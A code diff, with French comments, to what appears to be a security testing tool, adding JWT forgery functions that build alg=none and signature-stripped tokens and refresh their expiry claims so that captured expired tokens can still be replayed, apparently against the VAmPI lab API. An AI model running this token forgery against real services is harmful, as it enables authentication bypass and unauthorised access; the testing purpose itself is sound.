@@ -22,6 +22,7 @@ L'endpoint protégé provient du modèle sémantique (une route vue en 401/403).
 """
 import base64
 import json
+import time
 from dataclasses import dataclass
 from typing import Callable, Dict, List, Optional
 
@@ -37,32 +38,56 @@ def _b64url(raw: bytes) -> str:
     return base64.urlsafe_b64encode(raw).rstrip(b'=').decode()
 
 
-def _decode_payload(token: str) -> Optional[Dict]:
-    parts = token.split('.')
-    if len(parts) < 2:
-        return None
+def _decode_json(part: str) -> Optional[Dict]:
     try:
-        return json.loads(base64.urlsafe_b64decode(parts[1] + '=='))
+        return json.loads(base64.urlsafe_b64decode(part + '=='))
     except Exception:
         return None
 
 
+def _decode_payload(token: str) -> Optional[Dict]:
+    parts = token.split('.')
+    if len(parts) < 2:
+        return None
+    return _decode_json(parts[1])
+
+
+def _refresh_claims(payload: Dict) -> Dict:
+    """Rend le jeton forgé temporellement VALIDE : sans ça, un jeton capturé
+    expiré (cas très courant — VAmPI a un TTL de 60 s) est rejeté sur l'`exp`
+    périmé, et l'on rate un vrai bypass alg=none (faux négatif). On repousse donc
+    `exp` loin dans le futur et on aligne `iat`/`nbf` sur maintenant."""
+    p = dict(payload)
+    now = int(time.time())
+    if 'exp' in p:
+        p['exp'] = now + 3600
+    if 'iat' in p:
+        p['iat'] = now
+    if 'nbf' in p:
+        p['nbf'] = now
+    return p
+
+
 def forge_alg_none(token: str) -> Optional[str]:
-    """Reconstruit le jeton avec alg=none et signature vide, même payload."""
+    """Jeton alg=none, signature vide, claims temporels rafraîchis."""
     payload = _decode_payload(token)
     if payload is None:
         return None
     header = _b64url(json.dumps({"alg": "none", "typ": "JWT"}).encode())
-    body = _b64url(json.dumps(payload).encode())
+    body = _b64url(json.dumps(_refresh_claims(payload)).encode())
     return f"{header}.{body}."          # signature vide
 
 
 def forge_unsigned(token: str) -> Optional[str]:
-    """Garde l'en-tête d'origine mais vide la signature."""
+    """En-tête d'origine, signature vidée, claims temporels rafraîchis."""
     parts = token.split('.')
     if len(parts) != 3:
         return None
-    return f"{parts[0]}.{parts[1]}."
+    payload = _decode_json(parts[1])
+    if payload is None:
+        return None
+    body = _b64url(json.dumps(_refresh_claims(payload)).encode())
+    return f"{parts[0]}.{body}."
 
 
 @dataclass
